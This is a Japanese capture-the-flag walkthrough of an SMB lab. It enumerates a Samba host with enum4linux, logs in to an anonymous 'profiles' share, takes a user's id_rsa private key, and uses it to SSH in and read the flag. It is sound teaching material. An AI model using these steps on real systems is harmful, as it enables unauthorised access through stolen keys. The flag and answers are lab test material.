## 1.ターゲット情報
### 1-1.ターゲットIP
`10.10.3.153`  
  
### 1-2.オープンポート
`139`、`445`  
  
## 2.実　施
### 2-1.基本的な列挙をすべて実行してみましょう。まず、ワークグループ名は何でしょうか?    
```bash
┌──(kali㉿kali)-[~/Desktop/THM_SMB]
└─$ enum4linux 10.10.3.153
```
`enum4linux`を基本列挙で実行  
  
```bash
 ============================( Enumerating Workgroup/Domain on 10.10.3.153 )============================


[+] Got domain/workgroup name: WORKGROUP
```
`Enumerating Workgroup/Domain`欄を確認
#### flag
`WORKGROUP`
  
### 2-2.マシンの名前として何が出てきますか?
```bash
=================================( Share Enumeration on 10.10.3.153 )==================================


	Sharename       Type      Comment
	---------       ----      -------
	netlogon        Disk      Network Logon Service
	profiles        Disk      Users profiles
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            POLOSMB

```
さっきの結果から`Share Enumeration`欄を確認
#### flag
`POLOSMB`  
  
### 2-3.実行中のオペレーティング システムのバージョンは何ですか?
```bash
===================================( OS information on 10.10.3.153 )===================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.3.153 from srvinfo: 
	POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03
```
さっきの結果から`OS information`欄を確認
#### flag 
`6.1`  
  
### 2-4.調査する価値があると思われるシェアはどれですか?
```bash
 ==================================( Share Enumeration on 10.10.3.153 )==================================


	Sharename       Type      Comment
	---------       ----      -------
	netlogon        Disk      Network Logon Service
	profiles        Disk      Users profiles
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            POLOSMB
```
さっきの結果から`Share Enumeration`欄を確認  
`profiles`以外はデフォルトであるフォルダなので、怪しいとしたら、`profiles`という思考
#### flag
`profiles`  
  
### 2-5.興味のある共有がAnonymousアクセスを許可するように設定されているかどうか、つまり、ファイルを表示するために認証が必要ないかどうかを確認しましょう。
確かめろとのことなので、`Anonymous`でログインしてみる
```bash
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.3.153/profiles -U Anonymous
Password for [WORKGROUP\Anonymous]:
Try "help" to get a list of possible commands.
smb: \> 
```
ログイン可能  
#### flag 
`Y`  
  
### 2-6.貴重な情報が含まれている可能性のある興味深いドキュメントがないか調べてみましょう。このプロファイル フォルダーは誰のものだと思いますか?
とりあえず中をのぞく
   
```bash
smb: \> ls
  .                                   D        0  Tue Apr 21 20:08:23 2020
  ..                                  D        0  Tue Apr 21 19:49:56 2020
  .cache                             DH        0  Tue Apr 21 20:08:23 2020
  .profile                            H      807  Tue Apr 21 20:08:23 2020
  .sudo_as_admin_successful           H        0  Tue Apr 21 20:08:23 2020
  .bash_logout                        H      220  Tue Apr 21 20:08:23 2020
  .viminfo                            H      947  Tue Apr 21 20:08:23 2020
  Working From Home Information.txt      N      358  Tue Apr 21 20:08:23 2020
  .ssh                               DH        0  Tue Apr 21 20:08:23 2020
  .bashrc                             H     3771  Tue Apr 21 20:08:23 2020
  .gnupg                             DH        0  Tue Apr 21 20:08:23 2020

		12316808 blocks of size 1024. 7567324 blocks available
```
怪しいとすれば、`Working From Home Information.txt`か。  
一旦ダウンロードしてみる  
```bash
smb: \> get "Working From Home Information.txt"
getting file \Working From Home Information.txt of size 358 as Working From Home Information.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```
謎にスペースが入っていたりするときは文字列を`"(ダブルクォーテーション)`で囲む  
ダウンロードできたので、一旦ローカルに戻って中身を確認  
```bash
┌──(kali㉿kali)-[~/Desktop/THM_SMB]
└─$ cat Working\ From\ Home\ Information.txt        
John Cactus,

As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
possible, employees should work from home. As such- your account has now been enabled with ssh
access to the main server.

If there are any problems, please contact the IT department at it@polointernalcoms.uk

Regards,

James
Department Manager 
```
おそらく何かのメモだろうと思料。  
一番上の`John Cactus`は人名っぽいので、フォルダの所有者だと思われる。
#### flag
`John Cactus`  
  
### 2-7.彼が自宅で仕事をできるようにするためにどのようなサービスが設定されていますか?
さきほどのメモを`DeepL`で翻訳してみると以下の内容だった。
```bash
ジョン・カクタス

ご承知の通り、昨今のパンデミック（世界的大流行）のため、ポロ社の大半は、可能な限り社員は自宅で仕事をするべきだと主張してきました。
可能な限り、社員は自宅で仕事をするようにと主張しています。そのため、あなたのアカウントはメインサーバーへのssh
アクセスが可能になりました。

何か問題がありましたら、IT部門（it@polointernalcoms.uk）までご連絡ください。

よろしくお願いします、

ジェームス
部門マネージャー 
```  
`ssh`でリモートで仕事できるようになったとのこと
#### flag 
`ssh`  
  
### 2-8.これで、共有上のどのディレクトリを確認すればよいでしょうか?
`ssh`なら公開鍵認証で接続する可能性がある。ならば`.ssh`に鍵があるだろうという思考過程から、今いる共有フォルダに`.ssh`があるかもう一回見直す  
```bash
smb: \> ls
  .                                   D        0  Tue Apr 21 20:08:23 2020
  ..                                  D        0  Tue Apr 21 19:49:56 2020
  .cache                             DH        0  Tue Apr 21 20:08:23 2020
  .profile                            H      807  Tue Apr 21 20:08:23 2020
  .sudo_as_admin_successful           H        0  Tue Apr 21 20:08:23 2020
  .bash_logout                        H      220  Tue Apr 21 20:08:23 2020
  .viminfo                            H      947  Tue Apr 21 20:08:23 2020
  Working From Home Information.txt      N      358  Tue Apr 21 20:08:23 2020
  .ssh                               DH        0  Tue Apr 21 20:08:23 2020
  .bashrc                             H     3771  Tue Apr 21 20:08:23 2020
  .gnupg                             DH        0  Tue Apr 21 20:08:23 2020

		12316808 blocks of size 1024. 7567324 blocks available
```
異状なくみつかる  
#### flag 
`.ssh`

### 2-9.このディレクトリには、ユーザーがサーバー上で認証してアクセスできるようにする認証キーが含まれています。これらのキーのうち、最も役立つものはどれですか?
単純に`ssh`で接続して永続化をするためなら、`id_rsa`の方が重要かと思ったが、`id_rsa.pub`が重要でないという理由も思いつかない。  
正直どっちかしかないので、間違えたらもう一方をsubmitすればいいだろう。  
  
ここで一応`cd`で`.ssh`に移動して、`ls`でディレクトリの中身を見てみる
```bash
smb: \> cd .ssh
```
```bash
                                   D        0  Tue Apr 21 20:08:23 2020
  ..                                  D        0  Tue Apr 21 20:08:23 2020
  id_rsa                              A     1679  Tue Apr 21 20:08:23 2020
  id_rsa.pub                          N      396  Tue Apr 21 20:08:23 2020
  authorized_keys                     N        0  Tue Apr 21 20:08:23 2020

		12316808 blocks of size 1024. 7567324 blocks available
```

#### flag 
`id_rsa`  
  
### 2-10.すでに収集した情報を使用してアカウントのユーザー名を調べます。次に、サービスとキーを使用してサーバーにログインします。smb.txt フラグとは何ですか?
`ssh`でログインしなきゃいけないなら、とりあえずダウンロードだろ。  
ってことで、`id_rsa`をダウンロード。ついでに何か情報があるかもしれないので、`id_rsa.pub`もダウンロードしておく。  
```bash
smb: \.ssh\> get id_rsa
getting file \.ssh\id_rsa of size 1679 as id_rsa (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)

smb: \.ssh\> get id_rsa.pub
getting file \.ssh\id_rsa.pub of size 396 as id_rsa.pub (0.4 KiloBytes/sec) (average 1.2 KiloBytes/sec)

```
備忘録として、同時にファイルをダウンロードしようとして、`get id_rsa.pub id_rsa`や`get id_rsa.pub,id_rsa`などやってみたが、うまくいかなかった。  
やり方がまずいのか、ひとつひとつしかダウンロードできないのかはわからないが、`一個ずつ`の方が無難そう  
  
ダウンロードできたので、一旦ローカルに戻る。  
あとはユーザ情報の探索だが、`ssh-keygen`をして公開鍵を生成すると、鍵の中身に`ユーザ情報`が入るので、それを確認。  
このことは忘れないようにする。  
```bash
┌──(kali㉿kali)-[~/Desktop/THM_SMB]
└─$ cat id_rsa.pub                          
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDb7OaL8zLZ5Z8OU3wZPSIQHaoyI8Yc3I/8/Y6faWgYTZbfNPexli0jxdAeTeGy2X3XACWcB4HFejbiNsMYLjy517gwWKPBvN865i8uIQ0Gqayq/KmBHpuBbR0yX/SpyfyvzR3VD16pg/D+WT8hLaNHSYm6FNYLsmVnWDSJDBhS179czftuoW55mw/OqzWVr5ln9cKeeuXlNV1lqCjBqF3ClzEBvN4JW8GS/riLTeHcXeMIMUTuIpr4XovN/VivIlLqTYy7lHuUh6L2RqAfw5+FSr4QZW1zHCMoS6FooTomq/03EGJCGcp80/fT0e04n+7+PxnmvZQkOwe1A1hUG6C/ cactus@polosmb
```
最後の`cactus@polosmb`は、`ユーザ名@ホスト名`の記載であるため、ユーザ名は`cactus`となる。  
ここまでわかったので、実際に`ssh`でログインしてみる  
```bash
┌──(kali㉿kali)-[~/Desktop/THM_SMB]
└─$ chmod 600 id_rsa  
```
まずは、`id_rsa`を使えるようにするために権限を付与。  
権限は`600`でないといけないので注意。下手に'777'とかにしてもつながらなくて沼るので、よく覚えておく。  
ここまで来たら後はログインするだけ。  
```bash
┌──(kali㉿kali)-[~/Desktop/THM_SMB]
└─$ ssh -i id_rsa cactus@10.10.3.153 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jun  9 06:39:57 UTC 2024

  System load:  0.0                Processes:           92
  Usage of /:   33.3% of 11.75GB   Users logged in:     0
  Memory usage: 20%                IP address for eth0: 10.10.3.153
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

22 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jun  9 04:47:03 2024 from 10.9.0.5
cactus@polosmb:~$ 
```
`ssh`の`-i`オプションは、`鍵を明示的に指定`するためのオプション。  
確か指定しないと、`.ssh`の鍵を見に行ってしまうので、しっかり指定するようにする。  
  
ちゃんとプロンプトも返ってきたので、ファイルを探索して出力してフラグを取得する。  
```bash
cactus@polosmb:~$ find / -name smb.txt 2>/dev/null
/home/cactus/smb.txt
```
探索コマンドはもう言わずもがなのfindを使った。`find / -name smb.txt 2>/dev/null`  
直下にあったので、そのまま開く  
```bash
cactus@polosmb:~$ cat smb.txt
THM{smb_is_fun_eh?}
```
これでフラグ回収である。  
#### flag 
`THM{smb_is_fun_eh?}`
  